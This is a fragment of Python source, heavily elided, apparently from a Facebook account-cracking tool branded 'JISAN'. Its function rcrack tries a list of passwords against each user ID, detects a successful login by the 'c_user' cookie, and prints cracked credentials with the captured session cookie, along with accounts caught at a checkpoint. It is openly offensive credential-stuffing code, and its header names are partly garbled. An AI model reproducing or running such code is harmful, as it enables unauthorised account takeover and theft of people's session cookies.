...
for xd in range(10000):
    ...
    c=(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            "sec-feJISANh-dest": 'document',
            "sec-feJISANh-mode": 'navigate',
            "sec-feJISANh-site": 'same-origin',
            "sec-feJISANh-user": '?0',
            "pragma": 'no-cache',
            "priority": 'u=0',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \33[1;30m(JISAN-OK 💚)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('   \033[1;32m(JISAN-CP 💚)  ' +uid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r %s[JISAN] [%s/%s]  CP:- %s  OK:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
